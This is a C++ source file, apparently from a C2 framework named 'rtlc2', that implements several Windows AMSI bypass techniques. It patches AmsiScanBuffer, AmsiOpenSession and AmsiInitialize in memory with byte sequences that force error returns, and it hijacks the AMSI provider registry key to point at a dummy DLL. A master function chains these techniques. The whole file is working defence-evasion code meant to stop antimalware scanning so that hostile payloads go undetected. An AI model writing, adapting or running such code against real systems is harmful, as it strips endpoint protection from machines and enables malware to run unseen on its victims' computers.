// AMSI (Antimalware Scan Interface) Bypass - Windows only
// Patches AMSI functions to prevent in-memory scanning
#include "evasion.h"

#ifdef RTLC2_WINDOWS

#include <windows.h>
#include <cstring>

namespace rtlc2 {
namespace evasion {

// Helper: patch function prologue with given bytes
static bool PatchFunction(HMODULE hModule, const char* funcName,
                          const unsigned char* patch, size_t patchLen) {
    if (!hModule) return false;
    FARPROC pFunc = GetProcAddress(hModule, funcName);
    if (!pFunc) return false;

    DWORD oldProtect = 0;
    if (!VirtualProtect((LPVOID)pFunc, patchLen, PAGE_EXECUTE_READWRITE, &oldProtect))
        return false;

    memcpy((void*)pFunc, patch, patchLen);

    DWORD tmp = 0;
    VirtualProtect((LPVOID)pFunc, patchLen, oldProtect, &tmp);
    return true;
}

// Technique 1: Patch AmsiScanBuffer to return E_INVALIDARG
// This makes AMSI think every scan request is invalid, so it skips scanning
bool PatchAmsiScanBuffer() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return true; // AMSI not loaded = nothing to patch

    // x64: mov eax, 0x80070057 (E_INVALIDARG); ret
    unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    return PatchFunction(hAmsi, "AmsiScanBuffer", patch, sizeof(patch));
}

// Technique 2: Patch AmsiOpenSession to return E_FAIL
// Prevents any AMSI session from being created
bool PatchAmsiOpenSession() {
    HMODULE hAmsi = GetModuleHandleA("amsi.dll");
    if (!hAmsi) hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return true;

    // x64: mov eax, 0x80004005 (E_FAIL); ret
    unsigned char patch[] = { 0xB8, 0x05, 0x40, 0x00, 0x80, 0xC3 };
    return PatchFunction(hAmsi, "AmsiOpenSession", patch, sizeof(patch));
}

// Technique 3: Patch AmsiInitialize to fail
// Prevents AMSI from initializing at all in new processes
bool PatchAmsiInitialize() {
    HMODULE hAmsi = GetModuleHandleA("amsi.dll");
    if (!hAmsi) return true;

    unsigned char patch[] = { 0xB8, 0x01, 0x00, 0x07, 0x80, 0xC3 }; // E_NOTIMPL
    return PatchFunction(hAmsi, "AmsiInitialize", patch, sizeof(patch));
}

// Technique 4: COM provider hijack via registry
// Redirect the AMSI provider GUID to a dummy DLL
bool AmsiProviderHijack() {
    // The AMSI provider is registered under:
    // HKLM\SOFTWARE\Microsoft\AMSI\Providers\{GUID}
    // We can add our own provider that always returns clean
    // This requires admin privileges
    HKEY hKey;
    const char* subKey = "SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}";

    LONG result = RegCreateKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);

    if (result != ERROR_SUCCESS) return false;

    // Point to a non-existent DLL - AMSI will fail to load it and skip
    const char* dummyDll = "C:\\Windows\\Temp\\amsi_dummy.dll";
    RegSetValueExA(hKey, NULL, 0, REG_SZ, (const BYTE*)dummyDll, (DWORD)strlen(dummyDll) + 1);
    RegCloseKey(hKey);

    return true;
}

// Master bypass function - try techniques in order
bool BypassAMSI() {
    if (PatchAmsiScanBuffer()) return true;
    if (PatchAmsiOpenSession()) return true;
    if (PatchAmsiInitialize()) return true;
    // AmsiProviderHijack requires admin, try last
    AmsiProviderHijack();
    return false;
}

} // namespace evasion
} // namespace rtlc2

#endif // RTLC2_WINDOWS
